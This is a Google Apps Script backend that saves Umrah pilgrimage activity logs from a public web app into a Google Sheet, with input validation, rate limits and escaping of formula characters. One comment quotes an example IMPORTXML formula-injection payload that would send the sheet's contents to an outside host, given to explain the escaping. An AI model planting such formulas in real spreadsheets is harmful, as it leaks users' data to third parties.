/**
 * ============================================================
 * UMRAH ACTIVITY LOG — Google Apps Script
 * ============================================================
 */
const SHEET_NAME = 'Umrah Activity Log';

/**
 * This endpoint is public: anyone who has the URL can POST to it. Everything
 * that arrives is therefore untrusted. A cell whose text begins with = + - @
 * is evaluated by Sheets as a formula, so a submitted value such as
 *   =IMPORTXML("https://example.com/?d="&CONCATENATE(A1:I1),"//a")
 * would run when this spreadsheet is opened and send its contents away.
 * Every value is prefixed with an apostrophe in that case so it stays text.
 */
function cell(value) {
  var s = (value === null || value === undefined) ? '' : String(value);
  if (s.length > 500) s = s.slice(0, 500);
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

function doGet(e) {
  return ContentService.createTextOutput(JSON.stringify({ status: 'ok', message: 'Umrah Log API is running. Use POST to submit logs.' })).setMimeType(ContentService.MimeType.JSON);
}

/**
 * The endpoint cannot be made private: the URL ships inside a public offline PWA,
 * so anything embedded in the page as a key is readable by every visitor and is
 * theatre, not authentication. Real authentication would need a server, which this
 * app deliberately does not have.
 *
 * What is achievable, and what these two functions do, is to make the endpoint
 * useless for anything but its purpose: a submission must look like a genuine Umrah
 * log, and the sheet cannot be flooded. Combined with cell() above — which already
 * stops formula injection — the remaining worst case is a handful of plausible-looking
 * junk rows, not a compromised spreadsheet.
 */
function looksLikeUmrahLog(data) {
  if (!data || typeof data !== 'object') return false;
  // The client builds this as 'umrah-' + a base-36 timestamp.
  if (typeof data.sessionId !== 'string' || !/^umrah-[0-9a-z]{6,16}$/.test(data.sessionId)) return false;
  // '' until the pilgrim chooses; 'male' or 'female' after.
  if (data.userGender !== undefined && ['male', 'female', '', 'N/A'].indexOf(data.userGender) === -1) return false;
  if (!Array.isArray(data.logs) || data.logs.length === 0 || data.logs.length > 500) return false;
  // Every entry must carry the fields the app writes.
  for (var i = 0; i < data.logs.length; i++) {
    var l = data.logs[i];
    if (!l || typeof l !== 'object') return false;
    if (typeof l.time !== 'string' || typeof l.activity !== 'string') return false;
  }
  return true;
}

/** At most MAX_PER_DAY submissions a day, and MAX_PER_SESSION from one session. */
function withinQuota(sessionId) {
  var MAX_PER_DAY = 300;
  var MAX_PER_SESSION = 10;
  var props = PropertiesService.getScriptProperties();
  var today = new Date().toISOString().slice(0, 10);
  var dayKey = 'count-' + today;
  var sessionKey = 'session-' + today + '-' + sessionId;

  var day = Number(props.getProperty(dayKey) || 0);
  var session = Number(props.getProperty(sessionKey) || 0);
  if (day >= MAX_PER_DAY || session >= MAX_PER_SESSION) return false;

  props.setProperty(dayKey, String(day + 1));
  props.setProperty(sessionKey, String(session + 1));
  return true;
}

function doPost(e) {
  try {
    const data = JSON.parse(e.postData.contents);

    // Reject anything that is not a real log before touching the spreadsheet.
    if (!looksLikeUmrahLog(data)) {
      return ContentService.createTextOutput(JSON.stringify({ status: 'error', message: 'Could not save the log.' })).setMimeType(ContentService.MimeType.JSON);
    }
    if (!withinQuota(data.sessionId)) {
      return ContentService.createTextOutput(JSON.stringify({ status: 'error', message: 'Could not save the log.' })).setMimeType(ContentService.MimeType.JSON);
    }

    const ss = getOrCreateSpreadsheet();
    const sheet = ss.getSheetByName('Logs') || ss.insertSheet('Logs');
    
    if (sheet.getLastRow() === 0) {
      const headers = ['Session ID', 'Umrah Started', 'Log #', 'Timestamp', 'Type', 'Activity', 'Elapsed Duration', 'Total Umrah Duration', 'Gender', 'Total Paused', 'Device Info'];
      sheet.appendRow(headers);
      const headerRange = sheet.getRange(1, 1, 1, headers.length);
      headerRange.setFontWeight('bold').setBackground('#1B4332').setFontColor('#FFFFFF');
      sheet.setFrozenRows(1);
    }
    
    const sessionId = cell(data.sessionId || 'N/A');
    const umrahStarted = cell(data.umrahStarted || 'N/A');
    const totalDuration = cell(data.totalDuration || 'N/A');
    const deviceInfo = cell(data.deviceInfo || 'N/A');
    const userGender = cell(data.userGender || 'N/A');
    const totalPaused = cell(data.totalPausedTime || 'N/A');
    
    const logs = Array.isArray(data.logs) ? data.logs.slice(0, 500) : [];
    logs.forEach((log, index) => {
      log = (log && typeof log === 'object') ? log : {};
      sheet.appendRow([sessionId, umrahStarted, index + 1, cell(log.time), cell(log.type), cell(log.activity), cell(log.duration), totalDuration, userGender, totalPaused, deviceInfo]);
    });
    
    writeSummary(ss, data);
    // The spreadsheet's URL is not returned: any caller could ask for it.
    return ContentService.createTextOutput(JSON.stringify({ status: 'success', message: `Logged ${logs.length} entries` })).setMimeType(ContentService.MimeType.JSON);
      
  } catch (error) {
    // The real error goes to the script's own log, not back to the caller.
    console.error(error);
    return ContentService.createTextOutput(JSON.stringify({ status: 'error', message: 'Could not save the log.' })).setMimeType(ContentService.MimeType.JSON);
  }
}

function writeSummary(ss, data) {
  let summarySheet = ss.getSheetByName('Summary');
  if (!summarySheet) {
    summarySheet = ss.insertSheet('Summary');
    const headers = ['Date', 'Session ID', 'Umrah Started', 'Total Duration', 'Total Log Entries', 'Tawaf Rounds Logged', 'Saei Rounds Logged', 'Steps Completed', 'Gender', 'Total Paused', 'Device'];
    summarySheet.appendRow(headers);
    summarySheet.getRange(1, 1, 1, headers.length).setFontWeight('bold').setBackground('#C9A84C').setFontColor('#1B4332');
    summarySheet.setFrozenRows(1);
  }
  
  const logs = Array.isArray(data.logs) ? data.logs : [];
  const act = l => (l && typeof l.activity === 'string') ? l.activity : '';
  summarySheet.appendRow([
    new Date().toISOString(), cell(data.sessionId || 'N/A'), cell(data.umrahStarted || 'N/A'), cell(data.totalDuration || 'N/A'),
    logs.length, logs.filter(l => act(l).includes('Tawaf')).length, logs.filter(l => act(l).includes("Sa'i")).length,
    logs.filter(l => l && l.type === 'complete').length, cell(data.userGender || 'N/A'), cell(data.totalPausedTime || 'N/A'), cell(data.deviceInfo || 'N/A')
  ]);
}

function getOrCreateSpreadsheet() {
  const files = DriveApp.getFilesByName(SHEET_NAME);
  if (files.hasNext()) return SpreadsheetApp.open(files.next());
  return SpreadsheetApp.create(SHEET_NAME);
}